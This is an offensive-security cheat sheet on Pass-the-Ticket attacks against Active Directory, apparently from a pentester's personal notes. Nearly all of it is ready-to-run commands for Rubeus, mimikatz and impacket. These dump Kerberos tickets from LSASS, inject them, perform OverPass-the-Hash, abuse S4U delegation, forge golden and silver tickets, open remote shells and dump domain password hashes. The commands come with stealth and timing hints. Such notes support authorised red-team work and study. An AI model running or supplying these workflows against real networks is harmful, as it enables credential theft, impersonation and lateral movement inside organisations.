---
aliases:
  - PtT Tools
  - Rubeus
  - mimikatz kerberos
tags:
  - type/cheatsheet
  - technique/lateral-movement
  - technique/credential-access
  - env/windows
  - env/linux
  - asset/active-directory
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - '[[Pass-the-Ticket]]'
---
# Pass-the-Ticket - Tooling

***

## Rubeus

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `Rubeus.exe triage` | Lista todos los tickets del sistema (con LUIDs) | Pre-dump recon. |
| `Rubeus.exe dump /nowrap` | Dump todos — base64 usable | All tickets. |
| `Rubeus.exe dump /service:krbtgt /nowrap` | Solo TGTs | TGT-focused. |
| `Rubeus.exe dump /user:<user> /nowrap` | Tickets de user específico | Targeted. |
| `Rubeus.exe monitor /interval:5 /nowrap` | Watch nuevos logons | DA wait. |
| `Rubeus.exe harvest /interval:30` | Captura + renueva TGTs | Keep-alive. |
| `Rubeus.exe ptt /ticket:<base64_or_kirbi>` | Inyectar ticket | Post-dump. |
| `Rubeus.exe purge` | Limpiar tickets sesión | Pre/post op. |
| `Rubeus.exe asktgt /user:u /rc4:HASH /ptt` | OverPass-the-Hash | Hash → TGT → inject. |
| `Rubeus.exe asktgt /user:u /aes256:HASH /ptt /opsec` | OverPass con AES (stealth) | OPSEC. |
| `Rubeus.exe s4u /ticket:<TGT> /impersonateuser:admin /msdsspn:cifs/target /ptt` | S4U delegation | Delegation abuse. |
^ptt-tool-rubeus

```powershell
# Workflow completo: dump → inject → use
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x462d4 /service:krbtgt /nowrap
.\Rubeus.exe purge
.\Rubeus.exe ptt /ticket:<BASE64>
klist
dir \\target\c$
```

___

## mimikatz kerberos module

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `privilege::debug` | SeDebugPrivilege (required) | Always first. |
| `sekurlsa::tickets` | Lista tickets en LSASS | Recon. |
| `sekurlsa::tickets /export` | Export .kirbi files al CWD | Full extraction. |
| `kerberos::list` | Lista tickets de sesión actual | Sin priv extra. |
| `kerberos::ptt ticket.kirbi` | Inyectar .kirbi | Post-export. |
| `kerberos::purge` | Limpiar tickets | Pre/post op. |
| `kerberos::golden ...` | Forge Golden Ticket | Post-krbtgt hash. |
| `kerberos::silver ...` | Forge Silver Ticket | Post-service hash. |
^ptt-tool-mimi

```
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
:: → [0;3e7]-0-0-admin@krbtgt-CORP.LOCAL.kirbi

mimikatz # kerberos::purge
mimikatz # kerberos::ptt [0;3e7]-0-0-admin@krbtgt-CORP.LOCAL.kirbi
exit
klist
```

___

## impacket (Linux)

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `impacket-ticketConverter in.kirbi out.ccache` | .kirbi → .ccache | Post-Windows dump. |
| `impacket-ticketConverter in.ccache out.kirbi` | .ccache → .kirbi | Post-getST → Windows inject. |
| `impacket-getTGT domain/user:pass -dc-ip IP` | Obtener TGT directo | Con credenciales. |
| `impacket-getST -spn cifs/target -impersonate admin dom/svc:pass` | S4U ticket impersonation | Delegation abuse. |
| `impacket-psexec -k -no-pass dom/user@target` | Shell via Kerberos | Post KRB5CCNAME set. |
| `impacket-wmiexec -k -no-pass dom/user@target` | WMI shell via Kerberos | Stealth lateral. |
| `impacket-smbclient -k -no-pass dom/user@target` | SMB client | File ops. |
| `impacket-secretsdump -k -no-pass -just-dc dom/user@dc` | DA dump via Kerberos | Post-DA ticket. |
^ptt-tool-impacket

```bash
# Full workflow: getTGT → uso
impacket-getTGT corp.local/administrator:'P@ssw0rd' -dc-ip 10.10.10.5
export KRB5CCNAME=administrator.ccache
impacket-secretsdump -k -no-pass -just-dc-ntlm corp.local/administrator@dc01.corp.local
```

___

## klist / kinit (nativos)

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `klist` (Win/Linux) | Lista tickets activos | Verify inject. |
| `klist -e` (Linux) | Muestra encryption types | AES vs RC4 check. |
| `klist purge` (Windows) | Purge tickets | Cleanup. |
| `kdestroy` (Linux) | Destruye ccache activo | Cleanup. |
| `kinit user@DOMAIN` | Solicita TGT (prompt password) | Auth legítima / test. |
| `kinit -kt service.keytab svc@DOMAIN` | TGT desde keytab | Service accounts. |
^ptt-tool-klist

___

## ticketConverter (standalone)

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `impacket-ticketConverter ticket.kirbi ticket.ccache` | kirbi → ccache | Windows dump → Linux. |
| `impacket-ticketConverter ticket.ccache ticket.kirbi` | ccache → kirbi | Linux/getST → Windows. |
^ptt-tool-convert

```bash
# Convertir output de Rubeus (base64) a ccache
# 1. Decodificar base64 → .kirbi  
echo "<BASE64>" | base64 -d > ticket.kirbi
# 2. Convertir
impacket-ticketConverter ticket.kirbi ticket.ccache
export KRB5CCNAME=ticket.ccache
```

___

## Recursos

| **Recurso** | **URL** |
|:---:|:---:|
| Rubeus | `https://github.com/GhostPack/Rubeus` |
| impacket | `https://github.com/fortra/impacket` |
| HackTricks — PtT | `https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/pass-the-ticket` |
| The Hacker Recipes — PtT | `https://www.thehacker.recipes/ad/movement/kerberos/ptt` |
| Rubeus README | `https://github.com/GhostPack/Rubeus#readme` |
| MITRE ATT&CK T1550.003 | `https://attack.mitre.org/techniques/T1550/003/` |
^ptt-tool-resources

***
